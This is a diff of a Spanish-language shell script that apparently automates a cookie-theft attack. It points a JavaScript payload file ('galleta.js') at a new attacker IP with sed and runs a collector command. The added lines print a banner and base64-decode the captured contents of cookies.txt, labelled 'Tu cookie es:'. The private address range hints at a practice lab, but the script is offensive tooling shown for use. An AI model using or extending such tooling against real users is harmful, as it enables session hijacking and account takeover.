@@ -39,3 +39,10 @@ sed -i "s/http:\/\/10\.10\.14\.3/http:\/\/$nueva_ip/g" galleta.js
 
 # Ejecutar el comando galleta
 galletapython
+
+echo -e "\n\033[1;31m_________________________________________________________\033[0m\n"
+echo "Tu cookie es:"
+echo ""
+
+cat cookies.txt | base64 -d; echo
+echo -e "\n\033[1;31m_________________________________________________________\033[0m\n"
